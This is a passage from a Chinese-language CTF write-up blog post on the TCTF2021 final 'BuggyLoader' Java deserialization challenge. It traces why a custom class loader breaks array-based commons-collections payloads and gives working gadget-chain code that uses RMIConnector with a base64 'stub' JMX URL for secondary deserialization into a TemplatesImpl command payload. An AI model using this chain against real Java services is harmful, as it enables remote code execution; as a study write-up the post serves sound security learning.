+                        String path <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        Resource res <span class="token operator">=</span> ucp<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                                <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">}</span>
+                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span><span class="token punctuation">,</span> acc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>PrivilegedActionException</span> pae<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token punctuation">(</span>ClassNotFoundException<span class="token punctuation">)</span> pae<span class="token punctuation">.</span><span class="token function">getException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>并没有对传入的类类名是带有数组标记进行额外的处理，对path只是进行了简单的替换<br><code>String path = name.replace(&#39;.&#39;, &#39;/&#39;).concat(&quot;.class&quot;);</code><br>那么得到的的路径就非常的垃圾<br><code>[Lorg/apache/commons/collections/Transformer;.class</code><br>显然，这样子的路径是无法加载到类的</p>
+<h3 id="Class-forName-debug"><a href="#Class-forName-debug" class="headerlink" title="Class.forName debug"></a>Class.forName debug</h3><p>那么用Class.forName呢？<br>直接进forName函数，在forName的最后返回了这个<br><code>return forName0(name, initialize, loader, caller);</code><br>name还是带<code>[L</code>的类名，loader是我们传入的URLClassloader。<br>跟进该方法，结果发现这是个native方法，看不到内容，直接给我跳到了URLClassloader的loadClass方法中，但此时的类名已经被处理掉了，变成了正常的类名，去除了数组标记<br>然后就进入了之前使用的classloader.loadClass函数</p>
+<p>可以看出来，使用Class.forName进行类加载时，会有一个native方法对类名的修饰符进行修改，使其为一个正常的类完全限定名，而后才交给loadClass方法进行加载，而这里直接写了个loadClass，导致了最终得到了奇怪的路径，导致加载失败<br>所以orange下面的那句评论可以说是非常关键了。当然，shiro的加载失败情况更为复杂，这里不在赘述了，上述链接中给出了很多内容</p>
+<h3 id="失败的尝试"><a href="#失败的尝试" class="headerlink" title="失败的尝试"></a>失败的尝试</h3><p>这里的问题就在于，使用了这个buggy classloader后，cc链常用的payload中，transformer数组的方法就打不通了。orange也在文章中提到了新的打法，用不带数组的payload去打，比如JRMPListener，但是题目又给服务套了一层内网环境，用URLDNS打了一下发现机器不通外网。因此该方案同样无效</p>
+<p>首先是拿自带数组的经典CC5打了一遍，不过打起来的时候报错是<code>StackTraceElement</code>这个类找不到，而不是后面的Transformer数组</p>
+<p>java大师tr1ple发了我一份他写的templateImpl的payload，是直接把templateImpl作为TiedMapEntry的key，Transformer只放一个InvokerTransformer触发，这个乍一看是没有用到数组的，但是同样也是用BadAttributeValueExpException这个类触发的，而其继承自Exception继承自Throwable，而<code>StackTraceElement[]</code>就是Throwable中的一个成员变量。<br>不过这次运行的错误并不一致，调试之后发现StackTraceElement虽然加载没有成功，但是抛出的错误被catch住了，而ois会继续跑下去。<br>之后会去加载templateImpl类，并且会调用到templateImpl的readObject，在这里面会用buggyloader去加载其<code>_bytes</code>属性，而该属性是一个二维数组，同样无法被加载<br>同样，在抛出错误后被catch并继续ois流的读取，接下来会读到一个<code>[B</code>的描述符并进行加载，此时会直接读到错误的数据，抛出一个<code>StreamCorruptedException</code>，而该错误没有catch直接就程序终止了<br>目前暂未找到为什么templateImpl在加载过程中对ClassNotFound全都不管，最后是出现了流的数据乱掉了抛出的错误，而CC链则直接抛出了ClassNotFound</p>
+<p>学习完CC链后的更新<br>使用CC6的链去触发，<strong>TiedMapEntry+InvokerTransformer可以做到对任意类的public方法的调用</strong>，而CC6的HashSet就没有自带的数组，是不是能搞定？<br>结果还是不行。。。呜呜呜，报错还是流乱了，可能是真的<code>byte[][]</code>也不能加载吧</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>正解翻到了一个触发二次反序列化的点，使用的是<code>RMIConnector</code>这个类，其有一个public方法connect，其中调用findRMIServer方法，该方法通过给定的url去加载一个RMI的stub</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> RMIServer <span class="token function">findRMIServer</span><span class="token punctuation">(</span>JMXServiceURL directoryURL<span class="token punctuation">,</span>
+            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> environment<span class="token punctuation">)</span>
+            <span class="token keyword">throws</span> NamingException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+        <span class="token keyword">final</span> <span class="token keyword">boolean</span> isIiop <span class="token operator">=</span> RMIConnectorServer<span class="token punctuation">.</span><span class="token function">isIiopURL</span><span class="token punctuation">(</span>directoryURL<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>isIiop<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// Make sure java.naming.corba.orb is in the Map.</span>
+            environment<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>EnvHelp<span class="token punctuation">.</span>DEFAULT_ORB<span class="token punctuation">,</span><span class="token function">resolveOrb</span><span class="token punctuation">(</span>environment<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        String path <span class="token operator">=</span> directoryURL<span class="token punctuation">.</span><span class="token function">getURLPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> end <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> end <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/jndi/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token function">findRMIServerJNDI</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">,</span> environment<span class="token punctuation">,</span> isIiop<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/stub/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token function">findRMIServerJRMP</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">,</span> environment<span class="token punctuation">,</span> isIiop<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/ior/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>IIOPHelper<span class="token punctuation">.</span><span class="token function">isAvailable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"iiop protocol not available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token function">findRMIServerIIOP</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">,</span> environment<span class="token punctuation">,</span> isIiop<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">final</span> String msg <span class="token operator">=</span> <span class="token string">"URL path must begin with /jndi/ or /stub/ "</span> <span class="token operator">+</span>
+                    <span class="token string">"or /ior/: "</span> <span class="token operator">+</span> path<span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>而在使用协议为stub时，调用findRMIServerJRMP方法，而该方法对输入数据直接进行了反序列化</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> RMIServer <span class="token function">findRMIServerJRMP</span><span class="token punctuation">(</span>String base64<span class="token punctuation">,</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> env<span class="token punctuation">,</span> <span class="token keyword">boolean</span> isIiop<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// could forbid "iiop:" URL here -- but do we need to?</span>
+        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            serialized <span class="token operator">=</span> <span class="token function">base64ToByteArray</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">(</span><span class="token string">"Bad BASE64 encoding: "</span> <span class="token operator">+</span>
+                    e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">final</span> ByteArrayInputStream bin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">final</span> ClassLoader loader <span class="token operator">=</span> EnvHelp<span class="token punctuation">.</span><span class="token function">resolveClientClassLoader</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> ObjectInputStream oin <span class="token operator">=</span>
+                <span class="token punctuation">(</span>loader <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span>
+                    <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bin<span class="token punctuation">)</span> <span class="token operator">:</span>
+                    <span class="token keyword">new</span> <span class="token class-name">ObjectInputStreamWithLoader</span><span class="token punctuation">(</span>bin<span class="token punctuation">,</span> loader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Object stub<span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            stub <span class="token operator">=</span> oin<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">(</span><span class="token string">"Class not found: "</span> <span class="token operator">+</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>RMIServer<span class="token punctuation">)</span>stub<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>至于这个类怎么被找出来的，就只有问神仙了。。。。</p>
+<p>可以看到这个方法中使用的ois并非之前环境上下文中的buggyois，而是自己重新加载了一个新的ois，因此能绕过错误的classloader实现，再把一般情况下能打通的payload进行反序列化</p>
+<p>正常情况下可以打通的payload即为templateImpl，由于机器不出外网，将templateImpl的payload修改为tomcat获取response对象回显的payload</p>
+<p>这里直接抄wp的代码</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getRMIConnector</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        Constructor con <span class="token operator">=</span> InvokerTransformer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        con<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// need a public method</span>
+        InvokerTransformer transformer <span class="token operator">=</span> <span class="token punctuation">(</span>InvokerTransformer<span class="token punctuation">)</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token function">getTemplateImpl</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        BASE64Encoder base64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BASE64Encoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String result <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        JMXServiceURL jurl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JMXServiceURL</span><span class="token punctuation">(</span><span class="token string">"service:jmx:rmi:///stub/"</span><span class="token operator">+</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Map hashMapp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        RMIConnector rc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMIConnector</span><span class="token punctuation">(</span>jurl<span class="token punctuation">,</span>hashMapp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Map hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Map lazyMap <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        TiedMapEntry tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> rc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        HashSet hashSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"c014"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field fmap <span class="token operator">=</span> hashSet<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fmap<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        HashMap innimpl <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span> fmap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field ftable <span class="token operator">=</span> hashMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ftable<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> nodes <span class="token operator">=</span><span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ftable<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>innimpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object node <span class="token operator">=</span> nodes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        Field fnode <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fnode<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fnode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> hashSet<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>这里额外讲一下这个<code>JMXServiceURL(&quot;service:jmx:rmi:///stub/&quot;+result);</code>，wp中的url为<code>service:jmx:rmi://host:port/stub/payload</code><br>而我们知道内网机器并不出网，因此host和port理论上是没有用的，而在host和port本身不存在的情况下还能使用，这就有点奇怪，为此专门搜了一下这个协议是什么情况<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/netyeaxi/article/details/72758409">JMXServiceURL使用说明</a><br>简单的说就是这个host和port在连接方是client的时候是完全没有用的，而是server的时候也没什么大用（所以为什么还要设计这个东西呢。。。）因此直接不填也没关系<br>而看到findRMIServer中的处理，其使用的path来自于<code>String path = directoryURL.getURLPath();</code>，而getURLPath()直接返回的就是port之后的全部内容，可以说是真的完全不看一眼前面是什么了。乱写也没事，就占个坑</p>
+<p>神仙的wp<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hpdoger.cn/2021/10/08/title:%20TCTF2021-final-writeup-1/#bugglyloader">TCTF2021-final-writeup</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42021%20wp.html" rel="prev" title="第五空间2021 wp">
+      <i class="fa fa-chevron-left"></i> 第五空间2021 wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0.html" rel="next" title="Common-Collections系列payload复现">
+      Common-Collections系列payload复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TCTF2021-final-%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">[TCTF2021 final]复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#eeeenginx"><span class="nav-number">1.1.</span> <span class="nav-text">eeeenginx</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#win-win"><span class="nav-number">1.2.</span> <span class="nav-text">win-win</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wp%E7%8E%AF%E8%8A%82"><span class="nav-number">1.2.1.</span> <span class="nav-text">wp环节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROIS%E8%A7%A3"><span class="nav-number">1.2.2.</span> <span class="nav-text">ROIS解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NeSE%E8%A7%A3"><span class="nav-number">1.2.3.</span> <span class="nav-text">NeSE解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nu1l%E8%A7%A3"><span class="nav-number">1.2.4.</span> <span class="nav-text">Nu1l解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BuggyLoader"><span class="nav-number">1.3.</span> <span class="nav-text">BuggyLoader</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE-review"><span class="nav-number">1.3.1.</span> <span class="nav-text">双亲委派 review</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#loadClass-debug"><span class="nav-number">1.3.2.</span> <span class="nav-text">loadClass debug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Class-forName-debug"><span class="nav-number">1.3.3.</span> <span class="nav-text">Class.forName debug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%B0%9D%E8%AF%95"><span class="nav-number">1.3.4.</span> <span class="nav-text">失败的尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.3.5.</span> <span class="nav-text">题解</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
